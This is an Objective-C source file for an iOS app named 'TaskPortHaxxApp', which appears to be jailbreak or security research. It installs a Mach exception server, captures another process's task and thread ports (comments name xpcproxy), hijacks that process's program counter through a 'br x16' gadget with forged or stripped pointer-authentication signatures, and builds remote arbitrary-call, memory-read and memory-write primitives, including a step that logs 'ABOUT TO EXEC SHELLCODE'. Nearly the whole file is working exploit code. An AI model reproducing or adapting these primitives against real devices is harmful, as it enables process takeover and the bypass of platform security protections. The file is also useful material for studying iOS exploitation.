//
//  main.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

#import <UIKit/UIKit.h>
#import <os/lock.h>
#import "AppDelegate.h"
#include "Header.h"
// These are provided by mig
#include "mach_exc.h"
#include "mach_excServer.h"

#ifdef __arm64e__
#   define xpaci(x) __asm__ volatile("xpaci %0" : "+r"(x))
#else
#   define xpaci(x) (void)(x)
#endif

dispatch_semaphore_t sem_input_ready;
dispatch_semaphore_t sem_output_ready;
int num_exceptions_handled = 0;
arm_thread_state64_t *new_state;
kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_port,
                                                         mach_port_t thread,
                                                         mach_port_t task,
                                                         exception_type_t exception,
                                                         mach_exception_data_t code,
                                                         mach_msg_type_number_t codeCnt,
                                                         int *flavor,
                                                         const thread_state_t old_state_,
                                                         mach_msg_type_number_t old_state_cnt,
                                                         thread_state_t new_state_,
                                                         mach_msg_type_number_t *new_state_cnt)
{
    if (*flavor != ARM_THREAD_STATE64) {
        return KERN_FAILURE;
    }
    
    const _STRUCT_ARM_THREAD_STATE64 *old_state = (const arm_thread_state64_t*)old_state_;
    new_state = (arm_thread_state64_t*)new_state_;
    memcpy(new_state, old_state, sizeof(arm_thread_state64_t));
    *new_state_cnt = old_state_cnt;
    
    // static uint64_t pacFailedCount = 0;
    // if (exception == EXC_BAD_ACCESS && codeCnt == 2 && code[0] == 1 && (code[1] >> 36) == 0x2000000) {
    //     // PAC issue
    //     pacFailedCount++;
    //     // if ((pacFailedCount % 92792) == 0) {
    //     //     printf("PAC failure detected! total count: %llu\n", pacFailedCount);
    //     //     printf("current_pc: 0x%016llx\n", old_state->__x[31]);
    //     //     printf("0x%016llx\n", ((uint64_t)brX16Address & 0xFFFFFFFFF) | (pacFailedCount << 40));
    //     // }

    //     printf("PAC failure detected! total count: %llu\n", pacFailedCount);
    //     printf("Registers:\n"
    //                " x0: 0x%016llx  x1: 0x%016llx  x2: 0x%016llx  x3: 0x%016llx\n"
    //                " x4: 0x%016llx  x5: 0x%016llx  x6: 0x%016llx  x7: 0x%016llx\n"
    //                " x8: 0x%016llx  x9: 0x%016llx x10: 0x%016llx x11: 0x%016llx\n"
    //                "x12: 0x%016llx x13: 0x%016llx x14: 0x%016llx x15: 0x%016llx\n"
    //                "x16: 0x%016llx x17: 0x%016llx x18: 0x%016llx x19: 0x%016llx\n"
    //                "x20: 0x%016llx x21: 0x%016llx x22: 0x%016llx x23: 0x%016llx\n"
    //                "x24: 0x%016llx x25: 0x%016llx x26: 0x%016llx x27: 0x%016llx\n"
    //                "x28: 0x%016llx  fp: 0x%016llx  lr: 0x%016llx\n"
    //                " pc: 0x%016llx  sp: 0x%016llx psr: 0x%08x"
    //                "\n",
    //                old_state->__x[ 0], old_state->__x[ 1], old_state->__x[ 2], old_state->__x[ 3], old_state->__x[ 4], old_state->__x[ 5], old_state->__x[ 6], old_state->__x[ 7], old_state->__x[ 8], old_state->__x[ 9],
    //                old_state->__x[10], old_state->__x[11], old_state->__x[12], old_state->__x[13], old_state->__x[14], old_state->__x[15], old_state->__x[16], old_state->__x[17], old_state->__x[18], old_state->__x[19],
    //                old_state->__x[20], old_state->__x[21], old_state->__x[22], old_state->__x[23], old_state->__x[24], old_state->__x[25], old_state->__x[26], old_state->__x[27], old_state->__x[28],
    //                old_state->__x[29], old_state->__x[30], old_state->__x[31], old_state->__x[32], old_state->__cpsr);
        
    //     // uint64_t tmp = ((uint64_t)brX16Address & 0xFFFFFFFFF) | (pacFailedCount << 40);
    //     // new_state->__x[31] = tmp;

    //     new_state->__x[31] = 0x4141414141414141;

    //     return KERN_SUCCESS;
    // }
    
    printf("exception handler raise state - exception %d\n", exception);
    if (num_exceptions_handled == 0) {
        printf("got task port: %d\n", task);
        GlobalChildTaskPort = task;
        GlobalChildThreadPort = thread;
    } else {
        dispatch_semaphore_signal(sem_output_ready);
        if ((old_state->__x[30] & 0xFFFFFF00) != 0x41414100 || wantsDetach) {
            wantsDetach = NO;
            printf("Process might have crashed! unexpected lr value: 0x%llx\n", old_state->__x[30]);
            printf("Registers:\n"
                   " x0: 0x%016llx  x1: 0x%016llx  x2: 0x%016llx  x3: 0x%016llx\n"
                   " x4: 0x%016llx  x5: 0x%016llx  x6: 0x%016llx  x7: 0x%016llx\n"
                   " x8: 0x%016llx  x9: 0x%016llx x10: 0x%016llx x11: 0x%016llx\n"
                   "x12: 0x%016llx x13: 0x%016llx x14: 0x%016llx x15: 0x%016llx\n"
                   "x16: 0x%016llx x17: 0x%016llx x18: 0x%016llx x19: 0x%016llx\n"
                   "x20: 0x%016llx x21: 0x%016llx x22: 0x%016llx x23: 0x%016llx\n"
                   "x24: 0x%016llx x25: 0x%016llx x26: 0x%016llx x27: 0x%016llx\n"
                   "x28: 0x%016llx  fp: 0x%016llx  lr: 0x%016llx\n"
                   " pc: 0x%016llx  sp: 0x%016llx psr: 0x%08x"
                   "\n",
                   old_state->__x[ 0], old_state->__x[ 1], old_state->__x[ 2], old_state->__x[ 3], old_state->__x[ 4], old_state->__x[ 5], old_state->__x[ 6], old_state->__x[ 7], old_state->__x[ 8], old_state->__x[ 9],
                   old_state->__x[10], old_state->__x[11], old_state->__x[12], old_state->__x[13], old_state->__x[14], old_state->__x[15], old_state->__x[16], old_state->__x[17], old_state->__x[18], old_state->__x[19],
                   old_state->__x[20], old_state->__x[21], old_state->__x[22], old_state->__x[23], old_state->__x[24], old_state->__x[25], old_state->__x[26], old_state->__x[27], old_state->__x[28],
                   old_state->__x[29], old_state->__x[30], old_state->__x[31], old_state->__x[32], old_state->__cpsr);
            return KERN_FAILURE;
        }
    }
    
    __darwin_arm_thread_state64_set_pc_fptr(*new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX16Address, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
    //__darwin_arm_thread_state64_set_lr_fptr(*new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)0x41414100, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
    //new_state->__x[16] = (uint64_t)ptrauth_strip(dlsym(RTLD_DEFAULT, "sleep"), ptrauth_key_function_pointer);
    dispatch_semaphore_wait(sem_input_ready, DISPATCH_TIME_FOREVER);
    if (new_state->__x[16] == _tmp_ptr) {
        printf("ABOUT TO EXEC SHELLCODE at 0x%llx\n", _tmp_ptr);
        //wantsDetach = YES;
    }
    
    num_exceptions_handled++;
    return KERN_SUCCESS;
}

extern boolean_t mach_exc_server (mach_msg_header_t *msg, mach_msg_header_t *reply);
static void exception_server(mach_port_t exceptionPort, BOOL shouldExitOnException) {
    mach_msg_return_t rt;
    __Request__mach_exception_raise_state_identity_t msg;
    __Reply__mach_exception_raise_state_identity_t reply;
    BOOL handled = NO;
 
    printf("exception server starting\n");
    do {
        rt = mach_msg((mach_msg_header_t *)&msg, MACH_RCV_MSG, 0, sizeof(union __RequestUnion__mach_exc_subsystem), exceptionPort, 0, MACH_PORT_NULL);
        assert(rt == MACH_MSG_SUCCESS);
        // Call out to the mach_exc_server generated by mig and mach_exc.defs.
        // This will in turn invoke one of:
        // mach_catch_exception_raise()
        // mach_catch_exception_raise_state()
        // mach_catch_exception_raise_state_identity()
        // .. depending on the behavior specified when registering the Mach exception port.
        handled = mach_exc_server((mach_msg_header_t *)&msg, (mach_msg_header_t *)&reply);
 
        // Send the now-initialized reply
        rt = mach_msg((mach_msg_header_t *)&reply, MACH_SEND_MSG, reply.Head.msgh_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
        assert(rt == MACH_MSG_SUCCESS);
    } while (!shouldExitOnException || !handled);
}

mach_port_t setup_exception_server(void) {
    sem_input_ready = dispatch_semaphore_create(0);
    sem_output_ready = dispatch_semaphore_create(0);
    
    // find br x16
    uint32_t *func = ((uint32_t *)ptrauth_strip((void *)fcntl, ptrauth_key_function_pointer));
    for (; *func != 0xd61f0200;/* br x16 opcode */ func++) {}
    brX16Address = (void *)ptrauth_sign_unauthenticated((void *)(func), ptrauth_key_function_pointer, 0);
    
    printf("INFO of br x16 address:\n");
    printf("Unsigned: 0x%16llx\n", (uint64_t)func);
    printf("Signed:   0x%16llx\n", (uint64_t)brX16Address);

    // brX16Address will be first executed from xpcproxy
    // and then x16 will be pointed to arbitrary call, but x16 has some PAC issues maybe?
    brX16Address = (void *)func;
    printf("Signed2:  0x%16llx\n", (uint64_t)brX16Address);
    // brX16Address = (void *)0xb62cd70206b89848;
    // brX16Address = (void *)0x4142434445464748;
    
    mach_port_t server_port;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
    assert(kr == KERN_SUCCESS);
    kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);
    assert(kr == KERN_SUCCESS);
    kr = bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.exception_server", server_port);
    assert(kr == KERN_SUCCESS);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        exception_server(server_port, NO);
    });
    return server_port;
}

// unused
kern_return_t catch_mach_exception_raise_state (mach_port_t exception_port,
                                                exception_type_t exception,
                                                const mach_exception_data_t code,
                                                mach_msg_type_number_t code_cnt,
                                                int *flavor,
                                                const thread_state_t old_state_,
                                                mach_msg_type_number_t old_state_cnt,
                                                thread_state_t new_state_,
                                                mach_msg_type_number_t *new_state_cnt)
{
    // unused
    return KERN_FAILURE;
}
kern_return_t catch_mach_exception_raise (mach_port_t exception_port,
                                         mach_port_t thread,
                                         mach_port_t task,
                                         exception_type_t exception,
                                         mach_exception_data_t code,
                                         mach_msg_type_number_t codeCnt) {
   printf("catch_mach_exception_raise called\n");
   return KERN_FAILURE;
}

os_unfair_lock funcLock = OS_UNFAIR_LOCK_INIT;
uint64_t RemoteArbCallInternal(uint64_t pc, uint64_t args[], int argCount) {
    assert(argCount <= 8);
    
    xpaci(pc);
    new_state->__x[16] = pc;
    memcpy(&new_state->__x[0], args, argCount * sizeof(uint64_t));
    dispatch_semaphore_signal(sem_input_ready);
    dispatch_semaphore_wait(sem_output_ready, DISPATCH_TIME_FOREVER);
    
    printf("function returned x0=0x%llx\n", new_state->__x[0]);
    return new_state->__x[0];
}

uint64_t RemoteRead64(uint64_t address) {
    return RemoteArbCall(__atomic_load_8, address, 3);
}

void RemoteWrite64(uint64_t address, uint64_t value) {
    RemoteArbCall(__atomic_store_8, address, value, 0);
}

void RemoteWriteMemory(uint64_t address, const void *data, size_t length) {
    length = (length + 7) & ~7ULL;
    for (size_t offset = 0; offset < length; offset += 8) {
        RemoteWrite64(address + offset, *((uint64_t *)(data + offset)));
    }
}
// this might read overflow but idc for now
void RemoteWriteString(uint64_t address, const char *string) {
    size_t len = (strlen(string) + 7) & ~7ULL;
    RemoteWriteMemory(address, string, len);
}

void RemoteDetach(void) {
    // kill(SIGSTOP)
    // task_set_exception_ports
    mach_port_t task = (mach_port_t)RemoteArbCall(task_self_trap);
    RemoteArbCall(task_set_exception_ports, task, 2, 0, 1, 0);
}
